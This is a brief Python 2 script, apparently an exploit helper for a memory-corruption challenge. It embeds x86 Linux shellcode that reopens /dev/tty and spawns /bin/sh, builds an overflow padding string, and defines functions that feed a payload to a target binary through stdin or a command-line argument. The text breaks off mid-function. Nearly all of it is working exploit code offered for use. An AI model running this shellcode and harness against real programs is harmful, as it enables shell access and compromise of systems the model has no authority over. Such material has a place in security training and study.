from subprocess import Popen, PIPE
import string

SHELLCODE = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
FULL_PADDING = "".join([x * 4 for x in string.uppercase])

def run_file_with_stdin(bin_path, arg):
    p = Popen(bin_path, stdin=PIPE)
    return p.communicate(arg)

def run_file_with_args(bin_path, arg):
    p = Popen([bin_path, arg])